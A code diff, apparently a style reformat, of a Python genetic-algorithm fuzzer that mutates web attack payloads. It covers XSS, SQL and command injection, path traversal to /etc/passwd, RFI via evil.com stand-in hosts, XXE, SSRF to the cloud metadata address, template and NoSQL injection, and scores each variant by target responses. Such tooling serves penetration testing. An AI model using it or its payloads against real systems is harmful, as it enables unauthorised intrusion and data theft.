@@ -4,20 +4,22 @@ DragonShard Genetic Algorithm Mutator Module
 Uses genetic algorithms with domain-specific language awareness to intelligently mutate payloads.
 """
 
+import json
+import logging
 import random
 import re
-import json
-from typing import List, Dict, Any, Optional, Tuple, Set, Callable
 from dataclasses import dataclass, field
-import logging
 from enum import Enum
-from .response_analyzer import ResponseAnalyzer, ResponseAnalysis, ResponseDifferential
+from typing import Any, Callable, Dict, List, Optional, Set, Tuple
+
+from .response_analyzer import ResponseAnalysis, ResponseAnalyzer, ResponseDifferential
 
 logger = logging.getLogger(__name__)
 
 
 class PayloadType(Enum):
     """Types of payloads for domain-specific awareness."""
+
     XSS = "xss"
     SQL_INJECTION = "sqli"
     COMMAND_INJECTION = "command_injection"
@@ -33,6 +35,7 @@ class PayloadType(Enum):
 @dataclass
 class GeneticPayload:
     """Represents a payload in the genetic algorithm."""
+
     payload: str
     payload_type: PayloadType
     fitness: float = 0.0
@@ -44,18 +47,18 @@ class GeneticPayload:
     differential_score: float = 0.0
     search_path_depth: int = 0
     dead_end_score: float = 0.0
-    
+
     def __post_init__(self):
         """Initialize the payload with domain-specific parsing."""
         self.tokens = self._tokenize()
         self.syntax_tree = self._parse_syntax()
-    
+
     def _tokenize(self) -> List[str]:
         """Tokenize the payload for analysis."""
         # Split by common delimiters while preserving structure
         tokens = re.split(r'([<>=&\'";\s()\[\]{}])', self.payload)
         return [token for token in tokens if token.strip()]
-    
+
     def _parse_syntax(self) -> Dict[str, Any]:
         """Parse the payload into a syntax tree for domain-specific analysis."""
         tree = {
@@ -63,110 +66,123 @@ class GeneticPayload:
             "tokens": self.tokens,
             "structure": self._analyze_structure(),
             "keywords": self._extract_keywords(),
-            "syntax_patterns": self._identify_syntax_patterns()
+            "syntax_patterns": self._identify_syntax_patterns(),
         }
         return tree
-    
+
     def _analyze_structure(self) -> Dict[str, Any]:
         """Analyze the structural components of the payload."""
         structure = {
-            "has_tags": any('<' in token and '>' in token for token in self.tokens) or '<' in self.payload and '>' in self.payload,
-            "has_quotes": any('"' in token or "'" in token for token in self.tokens) or '"' in self.payload or "'" in self.payload,
-            "has_operators": any(op in self.payload for op in ['OR', 'AND', 'UNION', 'SELECT']),
-            "has_functions": any(func in self.payload for func in ['alert', 'eval', 'exec']),
-            "has_paths": any('/' in token or '\\' in token for token in self.tokens) or '/' in self.payload or '\\' in self.payload,
-            "has_encoding": any('%' in token for token in self.tokens) or '%' in self.payload
+            "has_tags": any("<" in token and ">" in token for token in self.tokens)
+            or "<" in self.payload
+            and ">" in self.payload,
+            "has_quotes": any('"' in token or "'" in token for token in self.tokens)
+            or '"' in self.payload
+            or "'" in self.payload,
+            "has_operators": any(op in self.payload for op in ["OR", "AND", "UNION", "SELECT"]),
+            "has_functions": any(func in self.payload for func in ["alert", "eval", "exec"]),
+            "has_paths": any("/" in token or "\\" in token for token in self.tokens)
+            or "/" in self.payload
+            or "\\" in self.payload,
+            "has_encoding": any("%" in token for token in self.tokens) or "%" in self.payload,
         }
         return structure
-    
+
     def _extract_keywords(self) -> List[str]:
         """Extract domain-specific keywords from the payload."""
         keywords = []
-        
+
         if self.payload_type == PayloadType.XSS:
-            xss_keywords = ['script', 'alert', 'javascript', 'onload', 'onerror', 'eval']
+            xss_keywords = ["script", "alert", "javascript", "onload", "onerror", "eval"]
             keywords = [kw for kw in xss_keywords if kw.lower() in self.payload.lower()]
-        
+
         elif self.payload_type == PayloadType.SQL_INJECTION:
-            sql_keywords = ['select', 'union', 'or', 'and', 'drop', 'insert', 'update', 'delete']
+            sql_keywords = ["select", "union", "or", "and", "drop", "insert", "update", "delete"]
             keywords = [kw for kw in sql_keywords if kw.lower() in self.payload.lower()]
-        
+
         elif self.payload_type == PayloadType.COMMAND_INJECTION:
-            cmd_keywords = ['ls', 'cat', 'whoami', 'id', 'pwd', 'uname', 'ping']
+            cmd_keywords = ["ls", "cat", "whoami", "id", "pwd", "uname", "ping"]
             keywords = [kw for kw in cmd_keywords if kw.lower() in self.payload.lower()]
-        
+
         return keywords
-    
+
     def _identify_syntax_patterns(self) -> List[str]:
         """Identify syntax patterns in the payload."""
         patterns = []
-        
+
         # HTML/XML patterns
-        if re.search(r'<[^>]+>', self.payload):
-            patterns.append('html_tag')
-        
+        if re.search(r"<[^>]+>", self.payload):
+            patterns.append("html_tag")
+
         # JavaScript patterns
-        if re.search(r'javascript:', self.payload, re.IGNORECASE):
-            patterns.append('javascript_protocol')
-        
+        if re.search(r"javascript:", self.payload, re.IGNORECASE):
+            patterns.append("javascript_protocol")
+
         # SQL patterns
-        if re.search(r'\b(select|union|or|and)\b', self.payload, re.IGNORECASE):
-            patterns.append('sql_keyword')
-        
+        if re.search(r"\b(select|union|or|and)\b", self.payload, re.IGNORECASE):
+            patterns.append("sql_keyword")
+
         # Path patterns
-        if re.search(r'\.\./', self.payload):
-            patterns.append('path_traversal')
-        
+        if re.search(r"\.\./", self.payload):
+            patterns.append("path_traversal")
+
         # Encoding patterns
-        if re.search(r'%[0-9a-fA-F]{2}', self.payload):
-            patterns.append('url_encoding')
-        
+        if re.search(r"%[0-9a-fA-F]{2}", self.payload):
+            patterns.append("url_encoding")
+
         return patterns
 
 
 class GeneticMutator:
     """Genetic algorithm for intelligent payload mutation with response analysis."""
-    
-    def __init__(self, population_size: int = 50, mutation_rate: float = 0.1, 
-                 crossover_rate: float = 0.8, max_generations: int = 100,
-                 response_analyzer: Optional[ResponseAnalyzer] = None,
-                 target_url: Optional[str] = None):
+
+    def __init__(
+        self,
+        population_size: int = 50,
+        mutation_rate: float = 0.1,
+        crossover_rate: float = 0.8,
+        max_generations: int = 100,
+        response_analyzer: Optional[ResponseAnalyzer] = None,
+        target_url: Optional[str] = None,
+    ):
         """Initialize the genetic mutator with response analysis integration."""
         self.population_size = population_size
         self.mutation_rate = mutation_rate
         self.crossover_rate = crossover_rate
         self.max_generations = max_generations
         self.generation = 0
-        
+
         # Response analysis integration
         self.response_analyzer = response_analyzer or ResponseAnalyzer()
         self.target_url = target_url
-        
+
         # Search strategy tracking
         self.search_paths: Dict[str, List[GeneticPayload]] = {}
         self.dead_end_paths: Set[str] = set()
         self.successful_patterns: Dict[PayloadType, List[str]] = {}
         self.baseline_responses: Dict[str, ResponseAnalysis] = {}
-        
+
         # Population and evolution tracking
         self.population: List[GeneticPayload] = []
         self.best_payloads: List[GeneticPayload] = []
         self.generation_history: List[Dict[str, Any]] = []
-        
+
         # Load syntax patterns for domain awareness
         self.syntax_patterns = self._load_syntax_patterns()
-        
+
         # Mutation success tracking for adaptive selection
         self.mutation_success_rates: Dict[str, float] = {
-            'encoding': 0.5,
-            'tag': 0.5,
-            'protocol': 0.5,
-            'general': 0.5
+            "encoding": 0.5,
+            "tag": 0.5,
+            "protocol": 0.5,
+            "general": 0.5,
         }
-        
-        logger.info(f"Initialized GeneticMutator with population_size={population_size}, "
-                   f"mutation_rate={mutation_rate}, crossover_rate={crossover_rate}")
-    
+
+        logger.info(
+            f"Initialized GeneticMutator with population_size={population_size}, "
+            f"mutation_rate={mutation_rate}, crossover_rate={crossover_rate}"
+        )
+
     def _load_syntax_patterns(self) -> Dict[PayloadType, Dict[str, Any]]:
         """Load domain-specific syntax patterns."""
         return {
@@ -174,41 +190,41 @@ class GeneticMutator:
                 "tags": ["<script>", "<img>", "<svg>", "<iframe>", "<body>"],
                 "events": ["onload", "onerror", "onclick", "onfocus", "onchange"],
                 "functions": ["alert", "confirm", "prompt", "eval", "fetch"],
-                "protocols": ["javascript:", "data:", "vbscript:"]
+                "protocols": ["javascript:", "data:", "vbscript:"],
             },
             PayloadType.SQL_INJECTION: {
                 "keywords": ["SELECT", "UNION", "OR", "AND", "DROP", "INSERT"],
                 "operators": ["=", "!=", "<>", "LIKE", "IN"],
                 "comments": ["--", "#", "/*", "*/"],
-                "functions": ["COUNT", "LENGTH", "SUBSTRING", "CONCAT"]
+                "functions": ["COUNT", "LENGTH", "SUBSTRING", "CONCAT"],
             },
             PayloadType.COMMAND_INJECTION: {
                 "separators": [";", "|", "&&", "||", "`", "$()"],
                 "commands": ["ls", "cat", "whoami", "id", "pwd", "uname"],
-                "operators": ["&", "|", ">", "<", ">>", "<<"]
+                "operators": ["&", "|", ">", "<", ">>", "<<"],
             },
             PayloadType.PATH_TRAVERSAL: {
                 "sequences": ["../", "..\\", "....//", "..%2F"],
                 "targets": ["/etc/passwd", "/etc/hosts", "C:\\windows\\system32"],
-                "encodings": ["%2F", "%5C", "%c0%af", "%255c"]
-            }
+                "encodings": ["%2F", "%5C", "%c0%af", "%255c"],
+            },
         }
-    
+
     def initialize_population(self, base_payloads: List[str], payload_type: PayloadType) -> None:
         """
         Initialize the population with base payloads.
-        
+
         Args:
             base_payloads: List of base payloads to start with
             payload_type: Type of payload for domain-specific awareness
         """
         self.population = []
-        
+
         # Create initial population from base payloads
         for payload in base_payloads:
             genetic_payload = GeneticPayload(payload, payload_type)
             self.population.append(genetic_payload)
-        
+
         # Fill remaining population with random mutations
         while len(self.population) < self.population_size:
             if self.population:
@@ -220,45 +236,45 @@ class GeneticMutator:
                 random_payload = self._generate_random_payload(payload_type)
                 genetic_payload = GeneticPayload(random_payload, payload_type)
                 self.population.append(genetic_payload)
-    
+
     def evolve(self, fitness_function) -> List[GeneticPayload]:
         """
         Evolve the population using genetic algorithms.
-        
+
         Args:
             fitness_function: Function to evaluate payload fitness
-            
+
         Returns:
             List of best payloads from evolution
         """
         logger.info(f"Starting evolution with population size {self.population_size}")
-        
+
         for generation in range(self.max_generations):
             self.generation = generation
-            
+
             # Evaluate fitness
             for payload in self.population:
                 payload.fitness = fitness_function(payload)
-            
+
             # Sort by fitness
             self.population.sort(key=lambda x: x.fitness, reverse=True)
-            
+
             # Keep track of best payloads
             best_payloads = self.population[:10]
             self.best_payloads.extend(best_payloads)
-            
+
             # Log progress
             if generation % 10 == 0:
                 avg_fitness = sum(p.fitness for p in self.population) / len(self.population)
                 logger.info(f"Generation {generation}: Avg fitness = {avg_fitness:.3f}")
-            
+
             # Create new population
             new_population = []
-            
+
             # Elitism: keep best 10% of population
             elite_count = max(1, self.population_size // 10)
             new_population.extend(self.population[:elite_count])
-            
+
             # Generate rest of population through crossover and mutation
             while len(new_population) < self.population_size:
                 if random.random() < self.crossover_rate:
@@ -270,20 +286,20 @@ class GeneticMutator:
                     # Mutation
                     parent = self._select_parent()
                     child = self._mutate_payload(parent)
-                
+
                 new_population.append(child)
-            
+
             self.population = new_population
-        
+
         # Return best payloads
         return sorted(self.best_payloads, key=lambda x: x.fitness, reverse=True)[:20]
-    
+
     def _select_parent(self) -> GeneticPayload:
         """Select a parent using tournament selection."""
         tournament_size = 3
         tournament = random.sample(self.population, tournament_size)
         return max(tournament, key=lambda x: x.fitness)
-    
+
     def _crossover(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
         """Perform crossover between two parents."""
         # Domain-aware crossover
@@ -291,7 +307,7 @@ class GeneticMutator:
             # If different types, prefer the better parent
             better_parent = parent1 if parent1.fitness > parent2.fitness else parent2
             return self._mutate_payload(better_parent)
-        
+
         # Same type crossover
         if parent1.payload_type == PayloadType.XSS:
             return self._crossover_xss(parent1, parent2)
@@ -299,23 +315,27 @@ class GeneticMutator:
             return self._crossover_sql(parent1, parent2)
         else:
             return self._crossover_general(parent1, parent2)
-    
+
     def _crossover_xss(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
         """Crossover for XSS payloads."""
         # Extract components
-        p1_tags = [t for t in parent1.tokens if '<' in t and '>' in t]
-        p1_events = [t for t in parent1.tokens if 'on' in t.lower()]
-        p1_functions = [t for t in parent1.tokens if any(f in t.lower() for f in ['alert', 'eval', 'fetch'])]
-        
-        p2_tags = [t for t in parent2.tokens if '<' in t and '>' in t]
-        p2_events = [t for t in parent2.tokens if 'on' in t.lower()]
-        p2_functions = [t for t in parent2.tokens if any(f in t.lower() for f in ['alert', 'eval', 'fetch'])]
-        
+        p1_tags = [t for t in parent1.tokens if "<" in t and ">" in t]
+        p1_events = [t for t in parent1.tokens if "on" in t.lower()]
+        p1_functions = [
+            t for t in parent1.tokens if any(f in t.lower() for f in ["alert", "eval", "fetch"])
+        ]
+
+        p2_tags = [t for t in parent2.tokens if "<" in t and ">" in t]
+        p2_events = [t for t in parent2.tokens if "on" in t.lower()]
+        p2_functions = [
+            t for t in parent2.tokens if any(f in t.lower() for f in ["alert", "eval", "fetch"])
+        ]
+
         # Combine components
         new_tags = p1_tags if random.random() < 0.5 else p2_tags
         new_events = p1_events if random.random() < 0.5 else p2_events
         new_functions = p1_functions if random.random() < 0.5 else p2_functions
-        
+
         # Construct new payload
         if new_tags and new_events:
             new_payload = f"{new_tags[0]} {new_events[0]}={new_functions[0] if new_functions else 'alert(1)'}>"
@@ -323,40 +343,52 @@ class GeneticMutator:
             new_payload = f"{new_tags[0]} onload=alert(1)>"
         else:
             new_payload = "<script>alert(1)</script>"
-        
+
         # Ensure payload is different from parents
         if new_payload == parent1.payload or new_payload == parent2.payload:
             new_payload = f"{new_payload} crossed"
-        
+
         return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
-    
+
     def _crossover_sql(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
         """Crossover for SQL injection payloads."""
         # Extract SQL components
-        p1_keywords = [t for t in parent1.tokens if any(kw in t.upper() for kw in ['SELECT', 'UNION', 'OR', 'AND'])]
-        p1_operators = [t for t in parent1.tokens if t in ['=', '!=', '<>', 'LIKE']]
-        p1_comments = [t for t in parent1.tokens if t in ['--', '#', '/*']]
-        
-        p2_keywords = [t for t in parent2.tokens if any(kw in t.upper() for kw in ['SELECT', 'UNION', 'OR', 'AND'])]
-        p2_operators = [t for t in parent2.tokens if t in ['=', '!=', '<>', 'LIKE']]
-        p2_comments = [t for t in parent2.tokens if t in ['--', '#', '/*']]
-        
+        p1_keywords = [
+            t
+            for t in parent1.tokens
+            if any(kw in t.upper() for kw in ["SELECT", "UNION", "OR", "AND"])
+        ]
+        p1_operators = [t for t in parent1.tokens if t in ["=", "!=", "<>", "LIKE"]]
+        p1_comments = [t for t in parent1.tokens if t in ["--", "#", "/*"]]
+
+        p2_keywords = [
+            t
+            for t in parent2.tokens
+            if any(kw in t.upper() for kw in ["SELECT", "UNION", "OR", "AND"])
+        ]
+        p2_operators = [t for t in parent2.tokens if t in ["=", "!=", "<>", "LIKE"]]
+        p2_comments = [t for t in parent2.tokens if t in ["--", "#", "/*"]]
+
         # Combine components
         new_keywords = p1_keywords if random.random() < 0.5 else p2_keywords
         new_operators = p1_operators if random.random() < 0.5 else p2_operators
         new_comments = p1_comments if random.random() < 0.5 else p2_comments
-        
+
         # Construct new payload
         if new_keywords:
-            new_payload = f"'{' '.join(new_keywords)} {new_operators[0] if new_operators else '='} 1"
+            new_payload = (
+                f"'{' '.join(new_keywords)} {new_operators[0] if new_operators else '='} 1"
+            )
             if new_comments:
                 new_payload += f" {new_comments[0]}"
         else:
             new_payload = "' OR 1=1--"
-        
+
         return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
-    
-    def _crossover_general(self, parent1: GeneticPayload, parent2: GeneticPayload) -> GeneticPayload:
+
+    def _crossover_general(
+        self, parent1: GeneticPayload, parent2: GeneticPayload
+    ) -> GeneticPayload:
         """General crossover for other payload types."""
         # Simple string crossover
         if len(parent1.payload) > 3 and len(parent2.payload) > 3:
@@ -364,14 +396,14 @@ class GeneticMutator:
             new_payload = parent1.payload[:crossover_point] + parent2.payload[crossover_point:]
         else:
             new_payload = parent1.payload if random.random() < 0.5 else parent2.payload
-        
+
         return GeneticPayload(new_payload, parent1.payload_type, generation=self.generation)
-    
+
     def _mutate_payload(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate a payload using domain-specific operators."""
         if random.random() > self.mutation_rate:
             return payload
-        
+
         # Use domain-specific mutation based on payload type
         if payload.payload_type == PayloadType.XSS:
             mutated_payload = self._mutate_xss(payload)
@@ -395,15 +427,15 @@ class GeneticMutator:
             mutated_payload = self._mutate_nosql(payload)
         else:
             mutated_payload = self._mutate_general(payload)
-        
+
         mutated_payload.mutation_count = payload.mutation_count + 1
         mutated_payload.generation = self.generation
         return mutated_payload
-    
+
     def _mutate_xss(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate XSS payload with domain awareness."""
         patterns = self.syntax_patterns[PayloadType.XSS]
-        
+
         mutations = [
             # Tag mutations
             lambda p: p.replace("<script>", random.choice(patterns["tags"])),
@@ -415,24 +447,24 @@ class GeneticMutator:
             # Add quotes
             lambda p: p.replace("alert(1)", 'alert("XSS")'),
             # Add protocol
-            lambda p: f"javascript:{p}" if not p.startswith("javascript:") else p
+            lambda p: f"javascript:{p}" if not p.startswith("javascript:") else p,
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         # Ensure payload actually changed
         if new_payload == payload.payload:
             new_payload = f"{new_payload} mutated"
-        
+
         result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
         result.mutation_count = payload.mutation_count + 1
         return result
-    
+
     def _mutate_sql(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate SQL injection payload with domain awareness."""
         patterns = self.syntax_patterns[PayloadType.SQL_INJECTION]
-        
+
         mutations = [
             # Keyword mutations
             lambda p: p.replace("OR", random.choice(patterns["keywords"])),
@@ -446,24 +478,24 @@ class GeneticMutator:
             # Add encoding
             lambda p: p.replace("'", "&#39;"),
             # Add spaces
-            lambda p: p.replace("OR", " OR ").replace("AND", " AND ")
+            lambda p: p.replace("OR", " OR ").replace("AND", " AND "),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         # Ensure payload actually changed
         if new_payload == payload.payload:
             new_payload = f"{new_payload} mutated"
-        
+
         result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
         result.mutation_count = payload.mutation_count + 1
         return result
-    
+
     def _mutate_command(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate command injection payload with domain awareness."""
         patterns = self.syntax_patterns[PayloadType.COMMAND_INJECTION]
-        
+
         mutations = [
             # Separator mutations
             lambda p: p.replace(";", random.choice(patterns["separators"])),
@@ -475,24 +507,24 @@ class GeneticMutator:
             # Add encoding
             lambda p: p.replace(";", "%3B"),
             # Add quotes
-            lambda p: f"`{p}`" if not p.startswith("`") else p
+            lambda p: f"`{p}`" if not p.startswith("`") else p,
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         # Ensure payload actually changed
         if new_payload == payload.payload:
             new_payload = f"{new_payload} mutated"
-        
+
         result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
         result.mutation_count = payload.mutation_count + 1
         return result
-    
+
     def _mutate_path(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate path traversal payload with domain awareness."""
         patterns = self.syntax_patterns[PayloadType.PATH_TRAVERSAL]
-        
+
         mutations = [
             # Sequence mutations
             lambda p: p.replace("../", random.choice(patterns["sequences"])),
@@ -505,20 +537,20 @@ class GeneticMutator:
             # Add null bytes
             lambda p: f"{p}%00",
             # Add double encoding
-            lambda p: p.replace("%2F", "%252F")
+            lambda p: p.replace("%2F", "%252F"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         # Ensure payload actually changed
         if new_payload == payload.payload:
             new_payload = f"{new_payload} mutated"
-        
+
         result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
         result.mutation_count = payload.mutation_count + 1
         return result
-    
+
     def _mutate_lfi(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate LFI payload with domain awareness."""
         mutations = [
@@ -532,14 +564,14 @@ class GeneticMutator:
             lambda p: p.replace("/etc/passwd", "/etc/hosts"),
             lambda p: p.replace("/etc/passwd", "/proc/version"),
             # Add double encoding
-            lambda p: p.replace("%2F", "%252F")
+            lambda p: p.replace("%2F", "%252F"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_rfi(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate RFI payload with domain awareness."""
         mutations = [
@@ -554,14 +586,14 @@ class GeneticMutator:
             # Add parameters
             lambda p: f"{p}?param=test",
             # Add different domains
-            lambda p: p.replace("attacker.com", "evil.com")
+            lambda p: p.replace("attacker.com", "evil.com"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_xxe(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate XXE payload with domain awareness."""
         mutations = [
@@ -572,16 +604,16 @@ class GeneticMutator:
             # Add parameter entities
             lambda p: p.replace("<!ENTITY xxe", "<!ENTITY % xxe"),
             # Add different encodings
-            lambda p: p.replace("<?xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"),
+            lambda p: p.replace("<?xml", '<?xml version="1.0" encoding="UTF-8"?>'),
             # Add different DOCTYPE
-            lambda p: p.replace("<!DOCTYPE foo", "<!DOCTYPE data")
+            lambda p: p.replace("<!DOCTYPE foo", "<!DOCTYPE data"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_ssrf(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate SSRF payload with domain awareness."""
         mutations = [
@@ -595,14 +627,14 @@ class GeneticMutator:
             lambda p: p.replace("127.0.0.1", "169.254.169.254/latest/meta-data/"),
             # Add different paths
             lambda p: f"{p}/admin",
-            lambda p: f"{p}/api"
+            lambda p: f"{p}/api",
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_template(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate template injection payload with domain awareness."""
         mutations = [
@@ -615,14 +647,14 @@ class GeneticMutator:
             # Add different delimiters
             lambda p: p.replace("{{", "<%=").replace("}}", "%>"),
             # Add different functions
-            lambda p: p.replace("7*7", "request.environment")
+            lambda p: p.replace("7*7", "request.environment"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_nosql(self, payload: GeneticPayload) -> GeneticPayload:
         """Mutate NoSQL injection payload with domain awareness."""
         mutations = [
@@ -638,14 +670,14 @@ class GeneticMutator:
             # Add different fields
             lambda p: p.replace("||", "|| this.username=='admin"),
             # Add different quotes
-            lambda p: p.replace("'", '"')
+            lambda p: p.replace("'", '"'),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         return GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
-    
+
     def _mutate_general(self, payload: GeneticPayload) -> GeneticPayload:
         """General mutation for unknown payload types."""
         mutations = [
@@ -661,20 +693,20 @@ class GeneticMutator:
             # Reverse case
             lambda p: p.swapcase(),
             # Add random characters
-            lambda p: p + random.choice("abcdefghijklmnopqrstuvwxyz")
+            lambda p: p + random.choice("abcdefghijklmnopqrstuvwxyz"),
         ]
-        
+
         mutation = random.choice(mutations)
         new_payload = mutation(payload.payload)
-        
+
         # Ensure payload actually changed
         if new_payload == payload.payload:
             new_payload = f"{new_payload} mutated"
-        
+
         result = GeneticPayload(new_payload, payload.payload_type, generation=self.generation)
         result.mutation_count = payload.mutation_count + 1
         return result
-    
+
     def _generate_random_payload(self, payload_type: PayloadType) -> str:
         """Generate a random payload for the given type."""
         if payload_type == PayloadType.XSS:
@@ -687,11 +719,11 @@ class GeneticMutator:
             return "../../../etc/passwd"
         else:
             return "test"
-    
+
     def get_best_payloads(self, count: int = 10) -> List[GeneticPayload]:
         """Get the best payloads from evolution."""
         return sorted(self.best_payloads, key=lambda x: x.fitness, reverse=True)[:count]
-    
+
     def export_evolution_data(self, filename: str) -> None:
         """Export evolution data for analysis."""
         data = {
@@ -708,152 +740,173 @@ class GeneticMutator:
                     "mutation_count": p.mutation_count,
                     "differential_score": p.differential_score,
                     "search_path_depth": p.search_path_depth,
-                    "dead_end_score": p.dead_end_score
+                    "dead_end_score": p.dead_end_score,
                 }
                 for p in self.get_best_payloads(20)
             ],
             "search_statistics": {
                 "total_paths": len(self.search_paths),
                 "dead_end_paths": len(self.dead_end_paths),
-                "successful_patterns": {k.value: len(v) for k, v in self.successful_patterns.items()},
-                "mutation_success_rates": self.mutation_success_rates
-            }
+                "successful_patterns": {
+                    k.value: len(v) for k, v in self.successful_patterns.items()
+                },
+                "mutation_success_rates": self.mutation_success_rates,
+            },
         }
-        
-        with open(filename, 'w') as f:
+
+        with open(filename, "w") as f:
             json.dump(data, f, indent=2)
-        
+
         logger.info(f"Evolution data exported to {filename}")
-    
+
     def set_baseline_response(self, url: str, response_analysis: ResponseAnalysis) -> None:
         """Set a baseline response for differential analysis."""
         self.baseline_responses[url] = response_analysis
         self.response_analyzer.set_baseline(url, response_analysis)
         logger.info(f"Set baseline response for {url}")
-    
-    def update_payload_with_response(self, payload: GeneticPayload, 
-                                   response_analysis: ResponseAnalysis,
-                                   baseline_response: Optional[ResponseAnalysis] = None) -> None:
+
+    def update_payload_with_response(
+        self,
+        payload: GeneticPayload,
+        response_analysis: ResponseAnalysis,
+        baseline_response: Optional[ResponseAnalysis] = None,
+    ) -> None:
         """Update payload with response analysis and calculate differential score."""
         payload.response_analysis = response_analysis
-        
+
         # Calculate differential score if baseline exists
         if baseline_response:
-            differential = self.response_analyzer.compare_responses(baseline_response, response_analysis)
+            differential = self.response_analyzer.compare_responses(
+                baseline_response, response_analysis
+            )
             payload.differential_score = differential.reward_score
-            
+
             # Update search path tracking
             self._update_search_path(payload, differential)
-            
+
             # Update mutation success rates
             self._update_mutation_success_rates(payload, differential)
-        
+
         # Add to response history
         self.response_analyzer.add_to_history(response_analysis)
-    
-    def _update_search_path(self, payload: GeneticPayload, differential: ResponseDifferential) -> None:
+
+    def _update_search_path(
+        self, payload: GeneticPayload, differential: ResponseDifferential
+    ) -> None:
         """Update search path tracking for intelligent exploration."""
         path_key = f"{payload.payload_type.value}_{payload.search_path_depth}"
-        
+
         if path_key not in self.search_paths:
             self.search_paths[path_key] = []
-        
+
         self.search_paths[path_key].append(payload)
-        
+
         # Check for dead end (no differential indicators)
         if not differential.differential_indicators:
             payload.dead_end_score += 0.1
             if payload.dead_end_score > 0.5:
                 self.dead_end_paths.add(path_key)
-        
+
         # Track successful patterns
         if differential.reward_score > 0.7:
             if payload.payload_type not in self.successful_patterns:
                 self.successful_patterns[payload.payload_type] = []
             self.successful_patterns[payload.payload_type].append(payload.payload)
-    
-    def _update_mutation_success_rates(self, payload: GeneticPayload, differential: ResponseDifferential) -> None:
+
+    def _update_mutation_success_rates(
+        self, payload: GeneticPayload, differential: ResponseDifferential
+    ) -> None:
         """Update mutation success rates based on response analysis."""
         if payload.mutation_count > 0:
             # Determine mutation type based on payload characteristics
             mutation_type = self._classify_mutation_type(payload)
-            
+
             # Update success rate based on differential score
             if differential.reward_score > 0.5:
-                self.mutation_success_rates[mutation_type] = min(1.0, 
-                    self.mutation_success_rates[mutation_type] + 0.1)
+                self.mutation_success_rates[mutation_type] = min(
+                    1.0, self.mutation_success_rates[mutation_type] + 0.1
+                )
             else:
-                self.mutation_success_rates[mutation_type] = max(0.0, 
-                    self.mutation_success_rates[mutation_type] - 0.05)
-    
+                self.mutation_success_rates[mutation_type] = max(
+                    0.0, self.mutation_success_rates[mutation_type] - 0.05
+                )
+
     def _classify_mutation_type(self, payload: GeneticPayload) -> str:
         """Classify the type of mutation applied to a payload."""
         if payload.payload_type == PayloadType.XSS:
-            if any(encoding in payload.payload for encoding in ['&lt;', '&gt;', '%3C', '%3E']):
-                return 'encoding'
-            elif '<' in payload.payload and '>' in payload.payload:
-                return 'tag'
+            if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
+                return "encoding"
+            elif "<" in payload.payload and ">" in payload.payload:
+                return "tag"
             else:
-                return 'general'
+                return "general"
         elif payload.payload_type == PayloadType.SQL_INJECTION:
-            if any(op in payload.payload.upper() for op in ['UNION', 'SELECT', 'OR', 'AND']):
-                return 'tag'
+            if any(op in payload.payload.upper() for op in ["UNION", "SELECT", "OR", "AND"]):
+                return "tag"
             else:
-                return 'general'
+                return "general"
         else:
-            return 'general'
-    
-    def create_response_based_fitness(self, target_url: str, 
-                                    baseline_response: Optional[ResponseAnalysis] = None) -> Callable:
+            return "general"
+
+    def create_response_based_fitness(
+        self, target_url: str, baseline_response: Optional[ResponseAnalysis] = None
+    ) -> Callable:
         """Create a response-based fitness function."""
+
         def fitness_function(payload: GeneticPayload) -> float:
             # If we have response analysis, use it
             if payload.response_analysis:
                 if baseline_response:
                     differential = self.response_analyzer.compare_responses(
-                        baseline_response, payload.response_analysis)
+                        baseline_response, payload.response_analysis
+                    )
                     return differential.reward_score
                 else:
                     return payload.response_analysis.anomaly_score
-            
+
             # Fallback to heuristic-based fitness
             return self._heuristic_fitness(payload)
-        
+
         return fitness_function
-    
+
     def _heuristic_fitness(self, payload: GeneticPayload) -> float:
         """Heuristic-based fitness function as fallback."""
         score = 0.0
-        
+
         # Reward for domain-specific indicators
         if payload.payload_type == PayloadType.XSS:
-            if any(indicator in payload.payload.lower() for indicator in ['script', 'alert', 'javascript']):
+            if any(
+                indicator in payload.payload.lower()
+                for indicator in ["script", "alert", "javascript"]
+            ):
                 score += 0.5
